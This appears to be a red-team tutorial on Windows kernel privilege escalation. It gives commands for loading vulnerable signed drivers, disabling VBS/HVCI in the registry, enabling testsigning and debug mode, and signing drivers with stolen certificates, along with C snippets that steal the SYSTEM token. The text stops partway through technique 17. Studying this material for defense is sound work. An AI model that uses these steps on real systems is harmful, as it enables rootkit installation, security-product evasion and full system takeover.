---
title: "Red Nexus Educational Content** | Kernel Security Research Series"
description: ""
date: ""
categories: []
tags: []
mermaid: true
---

# Windows Kernel Privilege Escalation — 20 Techniques

> **Red Nexus Educational Content** | Kernel Security Research Series
> 
> **Scope:** This document is produced strictly for educational, red team training, and defensive research purposes. All techniques described are for use in authorized lab environments only.

---

## Table of Contents

1. [Understanding the Threat Surface](#understanding-the-threat-surface)
2. [Architecture Overview](#architecture-overview)
3. [Technique 01 — WHQL Submission (Passing as a Legitimate Driver)](#technique-01--whql-submission-passing-as-a-legitimate-driver)
4. [Technique 02 — BYOVD: Bring Your Own Vulnerable Driver](#technique-02--byovd-bring-your-own-vulnerable-driver)
5. [Technique 03 — kdmapper: Manual Kernel Mapping via BYOVD](#technique-03--kdmapper-manual-kernel-mapping-via-byovd)
6. [Technique 04 — ci.dll Downgrade to Bypass DSE](#technique-04--cidll-downgrade-to-bypass-dse)
7. [Technique 05 — ItsNotASecurityBoundary DSE Bypass (Race Condition)](#technique-05--itsnotasecurityboundary-dse-bypass-race-condition)
8. [Technique 06 — TestSigning Mode](#technique-06--testsigning-mode)
9. [Technique 07 — Kernel Debugger Attachment (Debug Mode)](#technique-07--kernel-debugger-attachment-debug-mode)
10. [Technique 08 — F8 Boot Option — Disable Signature Enforcement](#technique-08--f8-boot-option--disable-signature-enforcement)
11. [Technique 09 — Stolen / Leaked Code-Signing Certificates](#technique-09--stolen--leaked-code-signing-certificates)
12. [Technique 10 — Fraudulent EV Certificate via WHCP Abuse](#technique-10--fraudulent-ev-certificate-via-whcp-abuse)
13. [Technique 11 — DKOM: Direct Kernel Object Manipulation](#technique-11--dkom-direct-kernel-object-manipulation)
14. [Technique 12 — Token Impersonation & Theft (Kernel-Level)](#technique-12--token-impersonation--theft-kernel-level)
15. [Technique 13 — Windows Kernel Pool/Heap Overflow](#technique-13--windows-kernel-poolheap-overflow)
16. [Technique 14 — Use-After-Free in Kernel Drivers (e.g. CLFS CVE-2025-32701)](#technique-14--use-after-free-in-kernel-drivers-eg-clfs-cve-2025-32701)
17. [Technique 15 — Kernel Race Condition Exploitation](#technique-15--kernel-race-condition-exploitation)
18. [Technique 16 — PatchGuard (KPP) Bypass — GhostHook / InfinityHook / ByePg](#technique-16--patchguard-kpp-bypass--ghosthook--infinityhook--byepg)
19. [Technique 17 — Windows Downdate / OS Downgrade Attack](#technique-17--windows-downdate--os-downgrade-attack)
20. [Technique 18 — Kernel Callback Hijacking via DKOM Code Caves](#technique-18--kernel-callback-hijacking-via-dkom-code-caves)
21. [Technique 19 — SMEP / SMAP Bypass for Kernel Code Execution](#technique-19--smep--smap-bypass-for-kernel-code-execution)
22. [Technique 20 — Cross-Signed Driver Program Abuse (Legacy Trust Chain)](#technique-20--cross-signed-driver-program-abuse-legacy-trust-chain)
23. [Detection & Defense Matrix](#detection--defense-matrix)
24. [Lab Setup Recommendations](#lab-setup-recommendations)

---

## Understanding the Threat Surface

Gaining **kernel-level privileges** on Windows is the holy grail of post-exploitation. A kernel implant runs in **Ring 0** — the same privilege ring as the operating system itself. From there, a[...]

- Terminate, blind, or manipulate any process (including EDR/AV)
- Install persistent rootkits invisible to user-land tools
- Read/write arbitrary physical or virtual memory
- Intercept system calls and kernel callbacks
- Escalate any process token to `NT AUTHORITY\SYSTEM`
- Bypass virtually all user-mode and kernel-mode security products

The primary gate protecting this surface is **Driver Signature Enforcement (DSE)**, combined with **PatchGuard (KPP)**, **HVCI**, and **Secure Boot**. The techniques in this document describe how [...]

---

## Architecture Overview

```
┌────────────────────────────────────────────────────────────────…[...]
│                        USER MODE (Ring 3)                        │
│   Applications │ Malware │ Admin Tools │ Security Products       │
└────────────────────────────┬───────────────────────────────────…[...]
                             │  syscall / IOCTL
┌────────────────────────────▼───────────────────────────────────…[...]
│                      KERNEL MODE (Ring 0)                        │
│                                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│  │ ntoskrnl │  │  ci.dll  │  │ Drivers  │  │ PatchGuard   │   │
│  │ (NT Exec)│  │  (DSE)   │  │(.sys)    │  │ (KPP)        │   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────────┘   │
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │               Kernel Data Structures                      │   │
│  │  EPROCESS  │  ETHREAD  │  Token  │  Callbacks  │  SSDT   │   │
│  └──────────────────────────────────────────────────────────┘   │
└────────────────────────────┬───────────────────────────────────…[...]
                             │
┌────────────────────────────▼───────────────────────────────────…[...]
│                    HYPERVISOR / VBS (Ring -1)                    │
│             HVCI │ Credential Guard │ SecureKernel.exe           │
└────────────────────────────────────────────────────────────────…[...]
```

### Key Security Features & Attacker Goals

| Security Feature | Purpose | Bypassed By |
|---|---|---|
| **DSE** (Driver Signature Enforcement) | Block unsigned drivers | BYOVD, ci.dll downgrade, TestSigning, stolen cert |
| **PatchGuard (KPP)** | Detect kernel structure modifications | GhostHook, InfinityHook, ByePg, DKOM |
| **HVCI** | Enforce code integrity in hypervisor | Requires disabling VBS/Secure Boot first |
| **SMEP** | Prevent kernel from executing user-mode pages | ROP chains, kernel pool spray |
| **KASLR** | Randomize kernel base address | Info leaks, predictable pool layouts |
| **Secure Boot** | Verify bootloader chain | Physical access, UEFI exploits |

---

## Technique 01 — WHQL Submission (Passing as a Legitimate Driver)

### Concept

**Windows Hardware Quality Labs (WHQL)** is Microsoft's official certification program for drivers. A driver signed through WHQL receives a **Microsoft attestation signature**, making it trusted b[...]

```
┌─────────────────┐      ┌───────────────────┐      ┌────────────────────[...]
│  Attacker builds │─────▶│  Submit to WHCP   │─────▶│  Microsoft signs it  │
│  "legitimate"   │      │  (HLK test pass)  │      │  via Attestation     │
│  .sys driver    │      └───────────────────┘      └──────────┬───────────┘
└─────────────────┘                                             │
                                                     ┌───────────▼───────────┐
                                                     │  Trusted signed driver │
                                                     │  loads on any Windows  │
                                                     └────────────────────────┘
```

### Steps

1. **Write a minimal kernel driver** that appears benign in its visible functionality (hardware utility, monitoring tool, etc.)
2. **Pass HLK (Hardware Lab Kit) tests** — the Windows Hardware Lab Kit runs compatibility tests. A driver designed to pass tests but behave differently in production is a dual-use strategy.
3. **Register a hardware vendor company** with a valid EV code-signing certificate.
4. **Submit to Windows Hardware Dev Center** (`partner.microsoft.com/dashboard`).
5. **Receive Microsoft-signed driver** — valid globally on all Windows 10/11 systems.

### Why It Works

Microsoft's attestation signing validates that the driver passes HLK tests and is signed by an EV certificate holder — it does **not** perform behavioral analysis of the driver's kernel logic.

> **Real-World Reference:** Mandiant documented threat actors abusing the WHCP attestation portal with fraudulently obtained EV certificates to have malware signed directly by Microsoft in 2022.

---

## Technique 02 — BYOVD: Bring Your Own Vulnerable Driver

### Concept

**BYOVD** is the most widely used kernel attack in modern red teaming and APT operations. The attacker does **not** create a malicious driver — instead, they bring a **legitimate, signed** driv[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                        BYOVD Attack Flow                            │
│                                                                     │
│  [User Space]                                                       │
│  Attacker (Admin) ──▶ Drop vulnerable.sys ──▶ sc.exe start svc     │
│                                                        │            │
│                                                        ▼            │
│  [Kernel Space]                                                     │
│  Windows loads & verifies signature ✓ ──▶ Driver runs in Ring 0    │
│                                                        │            │
│                                                        ▼            │
│  Attacker sends IOCTL ──▶ Trigger vuln ──▶ Arbitrary R/W           │
│                                                        │            │
│                                                        ▼            │
│  Overwrite EPROCESS.Token ──▶ Escalate to SYSTEM ✓                 │
└────────────────────────────────────────────────────────────────[...]
```

### Popular BYOVD Drivers

| Driver | CVE / Vulnerability | Capability |
|---|---|---|
| `DBUtil_2_3.sys` (Dell) | CVE-2021-21551 | Arbitrary memory R/W |
| `AsrDrv101.sys` (ASRock) | — | Physical memory R/W |
| `RTCore64.sys` (MSI Afterburner) | CVE-2019-16098 | Arbitrary memory R/W |
| `gdrv.sys` (Gigabyte) | CVE-2018-19320 | Ring 0 code exec |
| `iqvw64e.sys` (Intel NIC) | CVE-2015-2291 | Arbitrary memory R/W |
| `cpuz141_x64.sys` (CPU-Z) | — | Physical mem access |

### Steps

```bash
# Step 1: Drop the vulnerable driver (example: RTCore64.sys)
copy RTCore64.sys C:\Windows\Temp\

# Step 2: Create a kernel service
sc create RTCore64 type= kernel start= demand binPath= C:\Windows\Temp\RTCore64.sys

# Step 3: Start the service (loads into kernel)
sc start RTCore64

# Step 4: Communicate via IOCTL from exploit code
# (see code example below)
```

```c
// Step 4: IOCTL exploit skeleton (C)
#include <windows.h>

#define IOCTL_READ_MEM  0x80002048   // RTCore64 read primitive
#define IOCTL_WRITE_MEM 0x8000204C   // RTCore64 write primitive

HANDLE hDriver = CreateFileW(
    L"\\\\.\\RTCore64",
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING, 0, NULL
);

// Read EPROCESS.Token of SYSTEM process (pid=4)
// Write attacker's token field to point to SYSTEM token
// → Current process is now SYSTEM
```

> **Detection:** Microsoft maintains a **Vulnerable Driver Blocklist**. Check current list: `C:\Windows\System32\drivers\DriverSiPolicy.p7b`. Updated via Windows Update.

---

## Technique 03 — kdmapper: Manual Kernel Mapping via BYOVD

### Concept

`kdmapper` takes BYOVD one step further. It uses a signed vulnerable driver (`iqvw64e.sys` — Intel NIC driver) as a **loader** to manually map an entirely unsigned, arbitrary kernel driver into[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                     kdmapper Flow                                │
│                                                                  │
│  [User Mode]                                                     │
│  kdmapper.exe ──▶ Load iqvw64e.sys (signed, vulnerable)         │
│                             │                                    │
│                             ▼                                    │
│  [Kernel Mode]                                                   │
│  iqvw64e exploit ──▶ Arbitrary write primitive                  │
│                             │                                    │
│                             ▼                                    │
│  Manual map evil.sys ──▶ Allocate kernel pool (NX/RWX)         │
│                             │                                    │
│                             ▼                                    │
│  Resolve imports ──▶ Relocate sections ──▶ Call DriverEntry()  │
│                             │                                    │
│                             ▼                                    │
│  evil.sys running in Ring 0 — NOT in driver list (hidden)       │
└────────────────────────────────────────────────────────────────[...]
```

### Key Advantage

The mapped driver does **not** appear in the kernel's driver list (`lm` in WinDbg, `sc query type= driver`), making it stealthy.

### Steps

```bash
# Compile or download kdmapper
# Usage: kdmapper.exe <path_to_unsigned_driver.sys>

kdmapper.exe evil_driver.sys
# → Loads iqvw64e.sys internally
# → Exploits CVE-2015-2291 for arbitrary memory write
# → Maps evil_driver.sys into kernel space manually
# → Calls DriverEntry of evil_driver.sys
# → Unloads iqvw64e.sys (cleans up)
```

> **Reference tool:** `https://github.com/TheCruZ/kdmapper`

---

## Technique 04 — ci.dll Downgrade to Bypass DSE

### Concept

`ci.dll` (Code Integrity DLL) is the Windows component responsible for **Driver Signature Enforcement**. It parses security catalogues and validates driver signatures before the kernel loads them[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                    ci.dll Downgrade Attack Chain                    │
│                                                                     │
│  STEP 1: VBS Check                                                  │
│  Is VBS/HVCI enabled?                                               │
│     YES → Invalidate SecureKernel.exe OR disable via Registry       │
│     NO  → Proceed directly                                          │
│                         │                                           │
│                         ▼                                           │
│  STEP 2: Disable VBS in Registry (if not UEFI-locked)              │
│  HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard                 │
│  → Set "EnableVirtualizationBasedSecurity" = 0                      │
│                         │                                           │
│                         ▼                                           │
│  STEP 3: Replace ci.dll                                             │
│  Copy vulnerable version (10.0.22621.1376) to                      │
│  C:\Windows\System32\ci.dll                                         │
│  (Requires TrustedInstaller or SYSTEM + file rename trick)          │
│                         │                                           │
│                         ▼                                           │
│  STEP 4: Restart system                                             │
│  Vulnerable ci.dll loads → DSE is now ineffective                  │
│                         │                                           │
│                         ▼                                           │
│  STEP 5: Load unsigned driver freely                                │
│  sc create evil type=kernel binPath=evil.sys                        │
│  sc start evil → Loads without signature check                      │
└────────────────────────────────────────────────────────────────[...]
```

### Registry Steps

```powershell
# Disable VBS (requires admin, no UEFI lock)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
    /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f

reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
    /v HypervisorEnforcedCodeIntegrity /t REG_DWORD /d 0 /f

# Then replace ci.dll (requires elevated file access)
# Reboot required for changes to take effect
```

> **CVE Reference:** The downgrade attack leveraging `ci.dll` version `10.0.22621.1376` was documented by SafeBreach researcher Alon Leviev in conjunction with CVE-2024-21302 (Windows Downdate).

> **Mitigation:** Enable VBS with **UEFI Lock** + **Mandatory** flag. Without both, this attack is viable.

---

## Technique 05 — ItsNotASecurityBoundary DSE Bypass (Race Condition)

### Concept

Documented by Gabriel Landau (Elastic Security Labs) in July 2024, this technique exploits a **race condition** in Windows' security catalogue verification process. When the kernel is in the proc[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                 ItsNotASecurityBoundary Race Window                  │
│                                                                      │
│  Thread 1 (Kernel):                                                  │
│  OpenCatalogFile() ──▶ [READ signature] ──▶ Load driver             │
│                              ↑                                       │
│                         RACE WINDOW                                  │
│                              ↑                                       │
│  Thread 2 (Attacker):                                                │
│  Replace catalogue.cat ──▶ malicious.cat (signed for evil.sys)      │
│                                                                      │
│  Result: Kernel reads malicious catalogue → loads evil.sys ✓        │
└────────────────────────────────────────────────────────────────[...]
```

### Steps

1. **Prepare** a malicious `.sys` driver and generate a security catalogue (`evil.cat`) with an Authenticode signature for it (self-signed is sufficient for the catalogue entry).
2. **Write a race thread** that continuously replaces the legitimate catalogue with `evil.cat` at high frequency.
3. **Trigger kernel catalogue validation** concurrently (e.g., by initiating driver load).
4. **Win the race** — the kernel reads the swapped catalogue and approves the unsigned driver.
5. **Driver loads** with Ring 0 access.

> **Note:** Patched via KB5041160 (August 2024). Still exploitable on unpatched systems or via ci.dll downgrade to pre-patch version.

---

## Technique 06 — TestSigning Mode

### Concept

**TestSigning mode** is a legitimate Microsoft feature for driver developers. When enabled, Windows allows **any** driver signed with **any** certificate — including self-signed ones — to loa[...]

```
┌───────────────────────────────────────────────────────────┐
│               TestSigning Activation Flow                 │
│                                                           │
│  Attacker (Admin) ──▶ bcdedit /set testsigning on        │
│                                │                          │
│                                ▼                          │
│                           REBOOT                          │
│                                │                          │
│                                ▼                          │
│  Windows loads with TestSigning ──▶ DSE = relaxed        │
│  Watermark visible bottom-right corner of desktop        │
│                                │                          │
│                                ▼                          │
│  Load self-signed driver ──▶ Succeeds ✓                  │
└───────────────────────────────────────────────────────────┘
```

### Steps

```cmd
:: Step 1: Enable TestSigning (requires admin)
bcdedit /set testsigning on

:: Step 2: Disable Secure Boot in BIOS (if needed)
:: Step 3: Reboot

:: Step 4: Sign driver with self-signed cert
makecert -r -pe -ss PrivateCertStore -n "CN=TestCert" TestCert.cer
signtool sign /v /s PrivateCertStore /n "TestCert" evil.sys

:: Step 5: Load driver
sc create evil type= kernel start= demand binPath= C:\evil.sys
sc start evil
```

> **Limitation:** A visible watermark ("Test Mode") appears on the desktop, making this noisy. Stealthy operators combine this with techniques that remove or hide the watermark.

> **Detection:** Check BCD store: `bcdedit /enum all | findstr testsigning`

---

## Technique 07 — Kernel Debugger Attachment (Debug Mode)

### Concept

By design, when a **kernel debugger** is attached at boot, PatchGuard is **not initialized** and DSE is relaxed — unsigned drivers can be loaded by interacting with the debugger prompt. Attacke[...]

```
┌──────────────────────────────────────────────────────────┐
│              Kernel Debug Mode Abuse                     │
│                                                          │
│  Enable KDNET (kernel debugging over network)            │
│  bcdedit /debug on                                       │
│  bcdedit /dbgsettings net hostip:... port:...            │
│                         │                                │
│                         ▼                                │
│  Reboot target machine                                   │
│                         │                                │
│                         ▼                                │
│  KD attaches → PatchGuard NOT initialized                │
│  DSE relaxed → unsigned drivers allowed                  │
│                         │                                │
│                         ▼                                │
│  Detach debugger after load → driver stays in memory     │
└──────────────────────────────────────────────────────────┘
```

### Steps

```cmd
:: Enable kernel debugging
bcdedit /debug on
bcdedit /dbgsettings net hostip:192.168.1.10 port:50000 key:1.2.3.4

:: Reboot — on next boot, KD attached, PatchGuard disabled
:: Load unsigned driver via sc.exe or NtLoadDriver

:: Detach debugger (WinDbg on attacker machine)
:: KD detaches but loaded driver persists
```

---

## Technique 08 — F8 Boot Option — Disable Signature Enforcement

### Concept

Windows provides an **Advanced Boot Options** menu accessible via **F8 at boot**. One option is "Disable Driver Signature Enforcement" — this disables DSE for the **current boot session only** [...]

```
┌──────────────────────────────────────────────────────┐
│          F8 Boot Menu (Advanced Boot)            │
│                                                  │
│  > Safe Mode                                     │
│  > Safe Mode with Networking                     │
│  > Safe Mode with Command Prompt                 │
│  > Disable automatic restart...                  │
│  > Disable Driver Signature Enforcement  ◄───    │
│  > Disable Early Launch Anti-Malware Driver      │
│                                                  │
│  Effect: DSE = OFF for this session only         │
│  Reboot = DSE re-enabled                         │
└──────────────────────────────────────────────────────┘
```

### Steps

1. Reboot target (requires physical access or remote reboot).
2. Press **F8** during BIOS POST / before Windows logo.
3. Select **"Disable Driver Signature Enforcement"**.
4. Load malicious unsigned driver via `sc.exe`.
5. Actions persist for the session; driver may survive reboot if installed as service.

> **Limitation:** Requires physical or console access. Works on legacy BIOS. UEFI Secure Boot may prevent F8 option from functioning.

---

## Technique 09 — Stolen / Leaked Code-Signing Certificates

### Concept

Every kernel driver must be signed with a valid Authenticode certificate trusted by Windows. Attackers who obtain **stolen or leaked private keys** from legitimate software vendors can sign malic[...]

```
┌───────────────────────────────────────────────────────────────┐
│          Stolen Certificate Attack Chain                      │
│                                                               │
│  Source of certificates:                                      │
│  ├── Data breaches (vendor compromise)                        │
│  ├── Dark web markets ($2,000–$6,500 for EV certs)           │
│  ├── LAPSUS$: Leaked NVIDIA certs (expired 2014/2018)        │
│  └── Fraudulent company registration + cert issuance         │
│                              │                                │
│                              ▼                                │
│  signtool sign /fd sha256 /f stolen.pfx /p password evil.sys │
│                              │                                │
│                              ▼                                │
│  Windows validates cert chain → Loads driver ✓               │
│  (Even expired certs bypass some security products)          │
└───────────────────────────────────────────────────────────────┘
```

### Signing with a Stolen Certificate

```cmd
:: Sign driver with stolen/obtained PFX certificate
signtool sign ^
    /fd sha256 ^
    /f stolen_cert.pfx ^
    /p "certificate_password" ^
    /t http://timestamp.digicert.com ^
    evil_driver.sys

:: Verify signature
signtool verify /pa /v evil_driver.sys
```

> **Real-World Example:** The LAPSUS$ group stole NVIDIA code-signing certificates in 2022. Despite being expired, malware signed with them could bypass certain AV products and load on older Wind[...]

> **Real-World Example:** Mandiant reported that threat actors abused Microsoft's WHCP attestation signing process using illegitimately obtained EV certificates — the drivers were effectively s[...]

---

## Technique 10 — Fraudulent EV Certificate via WHCP Abuse

### Concept

**Extended Validation (EV) certificates** are the highest tier of code-signing certificates, requiring legal business verification. Attackers create **shell companies** with legitimate business r[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                   Fraudulent WHCP Abuse Chain                     │
│                                                                    │
│  1. Register shell company  ──▶  Obtain EIN / business license    │
│                │                                                   │
│                ▼                                                   │
│  2. Apply for EV cert  ──▶  DigiCert/Sectigo validates business   │
│                │                                                   │
│                ▼                                                   │
│  3. Sign malware driver with EV cert                              │
│                │                                                   │
│                ▼                                                   │
│  4. Submit to Microsoft WHCP attestation portal                   │
│                │                                                   │
│                ▼                                                   │
│  5. Microsoft signs driver ──▶ Globally trusted by Windows ✓     │
│                                                                    │
│  EV certs on dark web: $2,000–$6,500                             │
└────────────────────────────────────────────────────────────────[...]
```

> **Threat Intel:** Group-IB (July 2025) documented a thriving underground market for EV code-signing certificates, with prices ranging from $2,000 to $6,500 on criminal forums.

---

## Technique 11 — DKOM: Direct Kernel Object Manipulation

### Concept

**DKOM** manipulates kernel data structures directly — without going through official kernel APIs. The primary target is the `EPROCESS` structure, specifically the **doubly-linked list** (`Acti[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                    DKOM — Process Hiding                         │
│                                                                  │
│  Normal Process List (ActiveProcessLinks):                       │
│  [System] ◄──▶ [svchost] ◄──▶ [evil.exe] ◄──▶ [explorer]       │
│                                                                  │
│  After DKOM (unlink evil.exe):                                  │
│  [System] ◄──▶ [svchost] ◄──────────────────▶ [explorer]       │
│                               evil.exe still runs!              │
│                               Invisible to Task Manager ✓       │
│                               Invisible to EDR process lists ✓  │
└────────────────────────────────────────────────────────────────[...]
```

### EPROCESS Structure (simplified)

```c
typedef struct _EPROCESS {
    KPROCESS  Pcb;               // 0x00
    // ...
    LIST_ENTRY ActiveProcessLinks; // 0x448 (varies by build)
    // ...
    EX_FAST_REF Token;           // 0x4b8 — TARGET for privilege escalation
    // ...
} EPROCESS;
```

### Token Elevation via DKOM

```c
// Kernel driver code — steal SYSTEM token
PEPROCESS SystemProcess = PsInitialSystemProcess;  // SYSTEM (pid=4)
PEPROCESS TargetProcess = /* find our process */;

// Get token offset (varies by Windows build — use offsets DB)
ULONG TokenOffset = 0x4b8;  // Win10 22H2

// Steal SYSTEM's token
*(ULONG_PTR*)((ULONG_PTR)TargetProcess + TokenOffset) =
    *(ULONG_PTR*)((ULONG_PTR)SystemProcess + TokenOffset);

// Current process is now SYSTEM
```

---

## Technique 12 — Token Impersonation & Theft (Kernel-Level)

### Concept

Windows access control is built on **tokens**. Every process and thread has a token that defines its privileges and group memberships. Kernel-level token manipulation allows an attacker to copy t[...]

```
┌────────────────────────────────────────────────────────────────[...]
│              Kernel Token Theft Flow                           │
│                                                                │
│  Find SYSTEM process (PID 4)                                  │
│       │                                                        │
│       ▼                                                        │
│  Walk EPROCESS.Token ──▶ Get SYSTEM token pointer             │
│       │                                                        │
│       ▼                                                        │
│  Find our EPROCESS (PID = GetCurrentProcessId())              │
│       │                                                        │
│       ▼                                                        │
│  Overwrite our Token field ──▶ Point to SYSTEM token          │
│       │                                                        │
│       ▼                                                        │
│  All threads in our process now run as SYSTEM ✓               │
└────────────────────────────────────────────────────────────────[...]
```

### Exploit Steps (via BYOVD arbitrary write)

```c
// Step 1: Get base of ntoskrnl.exe (via NtQuerySystemInformation)
// Step 2: Find PsInitialSystemProcess export
// Step 3: Walk ActiveProcessLinks to find SYSTEM EPROCESS
// Step 4: Walk to find our EPROCESS  
// Step 5: Read SYSTEM token value
// Step 6: Write SYSTEM token into our EPROCESS.Token

// Result: cmd.exe spawned from our process is SYSTEM
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
CreateProcess(NULL, "cmd.exe", NULL, NULL, FALSE, 
              CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
// This cmd.exe now has NT AUTHORITY\SYSTEM
```

---

## Technique 13 — Windows Kernel Pool/Heap Overflow

### Concept

The Windows kernel uses a **pool allocator** to manage kernel-mode heap memory. A **pool overflow** corrupts adjacent allocations, allowing attackers to overwrite kernel objects (function pointer[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                   Kernel Pool Overflow                             │
│                                                                    │
│  Pool Layout (before overflow):                                    │
│  ┌──────────────┬──────────────┬──────────────┐                   │
│  │  Chunk A     │  Chunk B     │  Chunk C     │                   │
│  │  (vuln obj)  │  (our spray) │  (func ptr)  │                   │
│  └──────────────┴──────────────┴──────────────┘                   │
│                                                                    │
│  After overflow:                                                   │
│  ┌──────────────┬──────────────┬──────────────┐                   │
│  │  Chunk A     │  AAAAAAAAAAA │  EVIL_PTR    │                   │
│  │  (overflow!) │  (overwrite) │  (hijacked!) │                   │
│  └──────────────┴──────────────┴──────────────┘                   │
│                                                                    │
│  When hijacked function pointer is called → attacker code runs    │
└────────────────────────────────────────────────────────────────[...]
```

### Exploitation Steps

1. **Identify overflow** in a kernel driver via fuzzing or code review.
2. **Heap spray** — fill the pool with controlled objects to create a predictable layout.
3. **Trigger overflow** — write past the chunk boundary into the adjacent allocation.
4. **Overwrite a function pointer** or security descriptor of a kernel object.
5. **Trigger the corrupted pointer** — gain arbitrary code execution in Ring 0.
6. **Execute token theft shellcode**.

### Modern Mitigations

| Mitigation | What It Does |
|---|---|
| **Segment Heap (Win10 RS1+)** | Randomizes pool layout, makes spray harder |
| **Safe Unlinking** | Prevents classic LIST_ENTRY corruption |
| **Type Isolation (Win10 20H1+)** | Separates different pool types, prevents cross-type corruption |
| **NX Pool (Win8+)** | Non-executable kernel pool, requires ROP chain |

---

## Technique 14 — Use-After-Free in Kernel Drivers (e.g. CLFS CVE-2025-32701)

### Concept

A **Use-After-Free (UAF)** occurs when kernel code frees a memory object but retains a pointer to it. If an attacker can reclaim the freed memory with controlled data before the dangling pointer [...]

```
┌────────────────────────────────────────────────────────────────[...]
│                 Use-After-Free Flow                              │
│                                                                  │
│  STEP 1: Object allocated in kernel pool                        │
│  ptr = ExAllocatePool(...)  ──▶  [OBJ: func_ptr | data]        │
│                                                                  │
│  STEP 2: Object freed (premature or logic bug)                  │
│  ExFreePool(ptr)  ──▶  Memory returned to allocator            │
│  ptr still points to freed memory!  ← DANGLING POINTER         │
│                                                                  │
│  STEP 3: Attacker reclaims freed memory (heap spray)            │
│  Fill with: [EVIL_PTR | controlled_data]                        │
│                                                                  │
│  STEP 4: Original code uses dangling ptr                        │
│  call [ptr->func_ptr]  ──▶  calls EVIL_PTR                     │
│  ──▶  Kernel executes attacker shellcode                        │
└────────────────────────────────────────────────────────────────[...]
```

### CVE-2025-32701 — CLFS Driver UAF (Active Exploitation)

The **Windows Common Log File System (CLFS)** driver had an actively exploited UAF:

1. Attacker calls `CreateLogFile()` and `AddLogContainer()` to trigger specific log operations.
2. A CLFS log stream object is **freed prematurely** due to a logic bug.
3. Attacker **heap-sprays** to reclaim freed memory with controlled data.
4. Kernel dereferences the corrupted pointer → executes attacker code.
5. Bypasses KASLR due to **predictable object layouts** in CLFS pool allocations.

---

## Technique 15 — Kernel Race Condition Exploitation

### Concept

Race conditions occur when the kernel operates on a shared resource from multiple threads without proper synchronization. An attacker wins the race by **timing their operation** to occur between [...]

```
┌────────────────────────────────────────────────────────────────[...]
│              Race Condition Exploitation                       │
│                                                                │
│  Kernel Thread:                                                │
│  Time ──▶ [CHECK permission] ──────────────▶ [USE resource]  │
│                                    ↑                          │
│                              RACE WINDOW                      │
│                                    ↑                          │
│  Attacker Thread:                  │                          │
│  Time ──────────────▶ [MODIFY resource] ──────────────────▶  │
│                                                                │
│  Result: CHECK passes with legit data,                        │
│          USE operates on attacker-modified data               │
└────────────────────────────────────────────────────────────────[...]
```

### CVE-2025-62215 — Windows Kernel Race Condition (Nov 2025, Exploited)

```
Attack flow:
1. Attacker launches multiple threads simultaneously
2. Threads race to access the same kernel resource without sync
3. "Double Free" — same memory block freed twice
4. Kernel heap corrupted → attacker overwrites memory
5. Seize execution flow → SYSTEM privileges
```

### Steps

1. Gain low-privileged local access (prerequisite for all kernel exploits).
2. Craft a multi-threaded tool that simultaneously hammers the same kernel resource from multiple threads.
3. Trigger the timing window — the double-free corrupts the kernel heap.
4. Spray the heap with controlled kernel objects to reclaim the freed chunk.
5. Win the race → arbitrary kernel write primitive acquired.
6. Use write primitive to perform DKOM token theft → escalate to SYSTEM.

> **CVE-2025-62215** (CVSS 7.0) is a real-world example exploited in the wild as of November 2025 — a race condition in the Windows Kernel allowing local privilege escalation to SYSTEM.

---

## Technique 16 — PatchGuard (KPP) Bypass — GhostHook / InfinityHook / ByePg

### Concept

**PatchGuard (Kernel Patch Protection / KPP)** is Microsoft's anti-rootkit mechanism introduced in 64-bit Windows. It periodically checks critical kernel structures (SSDT, IDT, LSTAR MSR, GDT, ke[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                    PatchGuard Bypass Techniques                      │
│                                                                      │
│  ┌─────────────┐   ┌──────────────┐   ┌─────────────────────────┐  │
│  │  GhostHook  │   │ InfinityHook │   │        ByePg            │  │
│  │  (2017)     │   │  (2019)      │   │        (2019)           │  │
│  │             │   │              │   │                         │  │
│  │ Intel PT    │   │ System call  │   │ Exploits KPP's own      │  │
│  │ PMI handler │   │ tracing hook │   │ initialization timing   │  │
│  │ not watched │   │ HalPrivate   │   │ to neutralize checks    │  │
│  │ by KPP      │   │ DispatchTable│   │ before they begin       │  │
│  └─────────────┘   └──────────────┘   └─────────────────────────┘  │
└────────────────────────────────────────────────────────────────[...]
```

### GhostHook — Intel PT PMI Handler

- Allocates an **extremely small buffer** for Intel Processor Trace (PT) packet processing.
- CPU runs out of buffer space → opens a **Performance Monitoring Interrupt (PMI) handler**.
- PatchGuard does **not monitor** the PMI handler.
- Malicious code is hooked into the PMI handler → patches kernel structures invisibly.

### InfinityHook — System Call Tracing

```c
// InfinityHook abuses ETW (Event Tracing for Windows) system call hooking
// The HalPrivateDispatchTable is modified — not monitored by KPP

// 1. Enable system call trace via NtSetSystemInformation
// 2. Modify HalPrivateDispatchTable.HalQuerySystemInformation
// 3. Every syscall goes through our hook
// 4. Hook SSDT function pointers indirectly → KPP never sees direct patch
```

### DKOM Code Cave Bypass (Modern Approach)

```
Current defense: KPP validates that callback entries point within
                 legitimate driver address ranges.

Bypass: Place callback stub in a code cave within LEGITIMATE
        driver memory (RWX section), then point the callback there.
        KPP sees a valid address → no bugcheck.
        Stub redirects to attacker's actual code.
```

---

## Technique 17 — Windows Downdate / OS Downgrade Attack

### Concept

Discovered by SafeBreach researcher Alon Leviev and demonstrated at DEF CON 2024. **Windows Downdate** manipulates the Windows Update process itself to **downgrade critical OS components** — in[...]

```
┌────────────────────────────────────────────────────────────────[...]
│                     Windows Downdate Attack Chain                     │
│                                                                        │
│  [Fully patched Windows 11] ──▶ Run Downdate tool                    │
│                                         │                              │
│                              ┌──────────▼──────────┐                 │
│                              │  Manipulate Windows  │                 │
│                              │  Update pending ops  │                 │
│                              │  (Targets: ci.dll,   │                 │
│                              │   ntoskrnl, drivers) │                 │
│                              └──────────┬──────────┘                 │
│                                         │                              │
